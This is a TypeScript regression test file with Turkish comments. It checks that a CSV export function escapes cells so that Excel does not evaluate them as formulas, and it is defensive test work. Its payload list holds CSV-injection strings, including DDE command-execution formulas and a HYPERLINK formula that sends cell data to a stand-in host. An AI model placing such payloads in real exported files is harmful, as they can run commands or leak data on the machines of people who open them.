// apps/web/tests/viewer2d/exportCsv.test.ts
//
// REGRESYON: CSV dışa aktarımı, Excel'de FORMÜL olarak çalışabilecek bir hücre
// üretmemelidir (CSV enjeksiyonu). Senaryo adı/bileşen etiketi gibi hücreler
// kullanıcı veya içe aktarılan hat listesi tarafından belirlenir.

import { describe, expect, it } from "vitest";
import { csvEscapeCell } from "../../src/features/viewer2d/export/exportCsv";

/** Excel'in bir hücreyi formül saydığı başlangıç karakterleri. */
function wouldExcelEvaluate(cell: string): boolean {
  // Excel önce CSV tırnaklarını soyar, sonra içeriğe bakar.
  const unquoted = cell.startsWith('"') && cell.endsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
  return /^[=+\-@\t\r]/.test(unquoted);
}

describe("csvEscapeCell — CSV formül enjeksiyonu", () => {
  const payloads = [
    "=1+1",
    "=cmd|'/c calc'!A1",
    "@SUM(1+9)*cmd|'/c calc'!A1",
    "+1+1",
    "-1+1",
    '=HYPERLINK("http://kotu.site/?v="&A1,"Tikla")',
    "\t=1+1",
    "\r=1+1",
  ];

  it.each(payloads)("%j hücresi Excel'de formül olarak ÇALIŞMAZ", (payload) => {
    expect(wouldExcelEvaluate(csvEscapeCell(payload))).toBe(false);
  });

  it("zararsız metni DEĞİŞTİRMEZ", () => {
    expect(csvEscapeCell("Kışlık İşletme")).toBe("Kışlık İşletme");
    expect(csvEscapeCell("L-101")).toBe("L-101");
  });

  it("NEGATİF SAYILARI bozmaz (sayılar kullanıcı metni değildir)", () => {
    expect(csvEscapeCell(-5)).toBe("-5");
    expect(csvEscapeCell(-0.43)).toBe("-0.43");
    expect(csvEscapeCell(1.25)).toBe("1.25");
  });

  it("virgül/tırnak/satır sonu kaçırmayı KORUR", () => {
    expect(csvEscapeCell("a,b")).toBe('"a,b"');
    expect(csvEscapeCell('a"b')).toBe('"a""b"');
    expect(csvEscapeCell("a\nb")).toBe('"a\nb"');
  });

  it("hem formül hem virgül içeren hücre HER İKİ korumayı da alır", () => {
    const out = csvEscapeCell("=A1,B1");
    expect(out).toBe("\"'=A1,B1\"");
    expect(wouldExcelEvaluate(out)).toBe(false);
  });
});
